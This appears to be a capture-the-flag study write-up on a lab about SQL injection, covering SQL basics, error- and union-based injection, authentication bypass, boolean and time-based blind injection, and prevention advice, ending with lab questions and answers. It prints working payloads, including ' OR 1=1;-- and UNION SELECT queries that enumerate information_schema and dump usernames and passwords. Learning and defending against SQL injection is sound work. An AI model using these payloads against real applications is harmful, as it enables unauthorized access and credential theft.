# **Overview: SQL Basics and In-Band SQL Injection**

SQL (Structured Query Language) is a powerful language used to interact with databases. Web applications use SQL statements to retrieve, insert, update, and delete data stored in database tables. SQL Injection (SQLi) occurs when user input is improperly handled and directly inserted into SQL queries, allowing attackers to manipulate database operations.

This write-up covers fundamental SQL statements, how SQL Injection works, and how attackers exploit vulnerable web applications using In-Band SQL Injection techniques such as Error-Based and Union-Based SQLi.

## **Key Takeaways**

* SQL is used to manage and query databases.  
* Common SQL statements include:  
  * SELECT  
  * INSERT  
  * UPDATE  
  * DELETE  
* SQL Injection happens when unsanitized user input is included in SQL queries.  
* Attackers can manipulate queries to:  
  * Bypass authentication  
  * Access hidden data  
  * Extract usernames and passwords  
  * Enumerate database structures  
* In-Band SQL Injection uses the same communication channel to send payloads and receive results.  
* Error messages from databases can reveal useful information about the database structure.

# **SQL Fundamentals**

## **SELECT Statement**

The SELECT statement retrieves data from a database table.

Example:

SELECT \* FROM users;

This retrieves all columns from the users table.

### **Important Clauses**

* WHERE — Filters results  
* LIMIT — Restricts number of returned rows  
* LIKE — Searches using patterns  
* UNION — Combines results from multiple queries

### **Examples**

Retrieve a specific user:

SELECT \* FROM users WHERE username='admin';

Retrieve usernames starting with “a”:

SELECT \* FROM users WHERE username LIKE 'a%';

Retrieve usernames containing “mi”:

SELECT \* FROM users WHERE username LIKE '%mi%';

## **UNION Statement**

The UNION operator combines results from multiple SELECT queries.

Example:

SELECT name,address FROM customers  
UNION  
SELECT company,address FROM suppliers;

### **Rules for UNION**

* Same number of columns  
* Similar data types  
* Same column order

## **INSERT Statement**

Used to add new data into a table.

Example:

INSERT INTO users (username,password)  
VALUES ('bob','password123');

## **UPDATE Statement**

Used to modify existing data.

Example:

UPDATE users  
SET username='root',password='pass123'  
WHERE username='admin';

## **DELETE Statement**

Used to remove data from a table.

Example:

DELETE FROM users WHERE username='martin';

Without a WHERE clause:

DELETE FROM users;

This removes all records from the table.

# **What is SQL Injection?**

SQL Injection occurs when user-controlled input is inserted directly into SQL queries without proper sanitization or validation.

## **Example Vulnerable Query**

URL:

https://website.thm/blog?id=1

Backend query:

SELECT \* FROM blog WHERE id=1 AND private=0 LIMIT 1;

If an attacker modifies the URL:

https://website.thm/blog?id=2;--

The query becomes:

SELECT \* FROM blog WHERE id=2;-- AND private=0 LIMIT 1;

The \-- comments out the remaining query, bypassing restrictions.

## **Important Concepts**

* ; ends an SQL statement  
* \-- comments out remaining SQL code  
* Attackers use these to manipulate queries

# **Types of SQL Injection**

## **In-Band SQL Injection**

The attacker uses the same channel to:

* Send payloads  
* Receive results

### **Two Main Types**

* Error-Based SQL Injection  
* Union-Based SQL Injection

## **Error-Based SQL Injection**

Relies on database error messages to reveal information.

### **Example**

Adding:

'

may trigger:

SQL syntax error

This confirms the application is vulnerable.

## **Union-Based SQL Injection**

Uses the UNION operator to retrieve additional data.

### **Discovering Number of Columns**

Test:

1 UNION SELECT 1

If error occurs:

1 UNION SELECT 1,2

Continue until no error appears:

1 UNION SELECT 1,2,3

## **Extracting Database Information**

### **Get Database Name**

0 UNION SELECT 1,2,database()

### **List Tables**

0 UNION SELECT 1,2,group\_concat(table\_name)  
FROM information\_schema.tables  
WHERE table\_schema='sqli\_one'

### **List Columns**

0 UNION SELECT 1,2,group\_concat(column\_name)  
FROM information\_schema.columns  
WHERE table\_name='staff\_users'

### **Dump Usernames and Passwords**

0 UNION SELECT 1,2,  
group\_concat(username,':',password SEPARATOR '\<br\>')  
FROM staff\_users

# **Additional Information and Facts**

* information\_schema is a special database containing metadata about databases and tables.  
* group\_concat() combines multiple rows into one output string.  
* SQL syntax is generally case-insensitive.  
* SQL Injection remains one of the most common web vulnerabilities.  
* Poor input validation is the primary cause of SQL Injection.  
* SQL Injection can lead to:  
  * Data theft  
  * Authentication bypass  
  * Full database compromise  
  * Remote code execution in severe cases

# **Security Recommendations**

* Use prepared statements and parameterized queries  
* Validate and sanitize user input  
* Avoid displaying database error messages to users  
* Apply least privilege to database accounts  
* Use Web Application Firewalls (WAFs)

# **Questions and Answers**

**What SQL statement is used to retrieve data?**  
 SELECT

**What SQL clause can be used to retrieve data from multiple tables?**  
 UNION

**What SQL statement is used to add data?**  
 INSERT

**What character signifies the end of an SQL query?**  
 ;

**What is the flag after completing level 1?**  
 Retrieve the flag by extracting Martin’s password from the staff\_users table using Union-Based SQL Injection.

# **Overview: Blind SQL Injection**

Blind SQL Injection (Blind SQLi) occurs when a web application is vulnerable to SQL Injection but does not directly display database errors or query results to the attacker. Instead of receiving visible output, attackers rely on indirect responses such as page behavior, boolean responses, or delays in server response time to determine whether their payloads are successful.

Despite limited feedback, Blind SQL Injection can still allow attackers to enumerate databases, discover tables and columns, bypass authentication systems, and extract sensitive credentials.

## **Key Takeaways**

* Blind SQL Injection provides little or no direct output.  
* Attackers rely on:  
  * True/False responses  
  * Application behavior  
  * Time delays  
* Blind SQLi can still fully compromise a database.  
* Common Blind SQLi types:  
  * Authentication Bypass  
  * Boolean-Based SQLi  
  * Time-Based SQLi  
* Out-of-Band SQLi uses separate communication channels to retrieve data.  
* Poor input validation and unsafe SQL query construction are the primary causes.

# **Authentication Bypass**

Authentication bypass is one of the simplest forms of Blind SQL Injection. Instead of retrieving database contents, the attacker manipulates the SQL query so that it always returns a true condition.

## **Vulnerable Login Query**

SELECT \* FROM users  
WHERE username='%username%'  
AND password='%password%'  
LIMIT 1;

## **Injection Payload**

' OR 1=1;--

## **Resulting Query**

SELECT \* FROM users  
WHERE username=''  
AND password=''  
OR 1=1;

Because 1=1 is always true, the application assumes valid credentials were supplied and grants access.

## **Important Concepts**

* OR 1=1 forces the query condition to evaluate as true.  
* \-- comments out the remaining SQL code.  
* Authentication bypass does not require valid credentials.

# **Boolean-Based SQL Injection**

Boolean-Based SQL Injection relies on true/false responses from the application.

The attacker sends payloads that produce:

* TRUE responses  
* FALSE responses

These responses help enumerate database structures character by character.

## **Example Target**

https://website.thm/checkuser?username=admin

Response:

{"taken":true}

Changing the username:

admin123

Response:

{"taken":false}

## **Determining Number of Columns**

Initial payload:

admin123' UNION SELECT 1;--

Continue adding columns until response becomes TRUE:

admin123' UNION SELECT 1,2,3;--

This confirms the query has three columns.

# **Enumerating Database Information**

## **Discover Database Name**

admin123' UNION SELECT 1,2,3  
WHERE database() LIKE 's%';--

If TRUE is returned:

* Database name starts with s

Continue character-by-character enumeration until discovering:

sqli\_three

# **Enumerating Tables**

admin123' UNION SELECT 1,2,3  
FROM information\_schema.tables  
WHERE table\_schema='sqli\_three'  
AND table\_name LIKE 'u%';--

Eventually discovers:

users

# **Enumerating Columns**

admin123' UNION SELECT 1,2,3  
FROM information\_schema.columns  
WHERE table\_schema='sqli\_three'  
AND table\_name='users'  
AND column\_name LIKE 'p%';--

Discovered columns:

* id  
* username  
* password

# **Extracting Credentials**

## **Discover Username**

admin123' UNION SELECT 1,2,3  
FROM users  
WHERE username LIKE 'a%';--

Discovered username:

admin

## **Discover Password**

admin123' UNION SELECT 1,2,3  
FROM users  
WHERE username='admin'  
AND password LIKE '3%';--

Discovered password:

3845

# **Time-Based SQL Injection**

Time-Based SQL Injection uses response delays instead of visual indicators.

The attacker injects SQL payloads containing delay functions such as SLEEP().

## **Example Payload**

admin123' UNION SELECT SLEEP(5),2;--

If the server pauses for 5 seconds:

* The payload was successful.

If no delay occurs:

* The payload failed.

## **Discovering Database Name**

admin123' UNION SELECT SLEEP(5),2  
WHERE database() LIKE 'u%';--

A delay confirms the database name begins with u.

# **Out-of-Band SQL Injection**

Out-of-Band SQL Injection uses two separate communication channels:

* One channel to launch the attack  
* Another channel to receive extracted data

## **Example Workflow**

1. Attacker sends malicious SQL payload.  
2. Database processes injected query.  
3. Database triggers outbound request to attacker-controlled server.  
4. Sensitive data is exfiltrated through:  
   * HTTP  
   * DNS

# **Additional Information and Facts**

* Blind SQLi is slower than In-Band SQLi because attackers extract data character-by-character.  
* information\_schema is commonly used to enumerate databases, tables, and columns.  
* Time-Based SQLi is often used when no visible output exists.  
* Boolean-Based SQLi relies heavily on observing application behavior changes.  
* Out-of-Band SQLi is less common because it depends on external connectivity being enabled.

# **Remediation and Prevention**

## **Prepared Statements**

Prepared statements separate SQL logic from user input.

Benefits:

* Prevent query manipulation  
* Improve code readability  
* Secure database interactions

## **Input Validation**

Restrict user input using:

* Allow lists  
* Character filtering  
* Type checking

## **Escaping User Input**

Special characters such as:

' " $ \\

should be escaped to prevent breaking SQL syntax.

# **Security Recommendations**

* Use parameterized queries  
* Disable verbose database error messages  
* Validate all user input  
* Apply least privilege to database accounts  
* Monitor unusual database activity  
* Use Web Application Firewalls (WAFs)

# **Questions and Answers**

**What is the flag after completing level two?**  
 Retrieve the flag after successfully bypassing authentication using Blind SQL Injection.

**What is the flag after completing level three?**  
 Retrieve the flag after enumerating the username and password using Boolean-Based SQL Injection.

**What is the final flag after completing level four?**  
 Retrieve the final flag after exploiting Time-Based SQL Injection.

**Name a protocol beginning with D that can be used to exfiltrate data from a database.**  
 DNS

